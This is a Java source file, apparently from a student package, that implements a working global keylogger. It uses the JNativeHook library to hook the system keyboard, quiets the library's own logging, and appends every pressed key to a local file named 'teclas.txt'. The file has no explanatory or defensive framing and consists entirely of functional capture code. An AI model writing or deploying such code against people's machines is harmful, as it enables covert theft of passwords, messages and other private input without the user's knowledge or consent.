package ge.edu.sangu;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class RegistradorDeTeclas implements NativeKeyListener {

    private static final Path arquivo = Paths.get("teclas.txt");
    private static final Logger logger = LoggerFactory.getLogger(RegistradorDeTeclas.class);

    public static void main(String[] args) {
        logger.info("Registrador de teclas iniciado");

        inicializar();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new RegistradorDeTeclas());
    }

    private static void inicializar() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String textoTecla = NativeKeyEvent.getKeyText(e.getKeyCode());
        
        try (OutputStream os = Files.newOutputStream(arquivo, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter escritor = new PrintWriter(os)) {
            
            if (textoTecla.length() > 1) {
                escritor.print("[" + textoTecla + "]");
            } else {
                escritor.print(textoTecla);
            }
            
        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
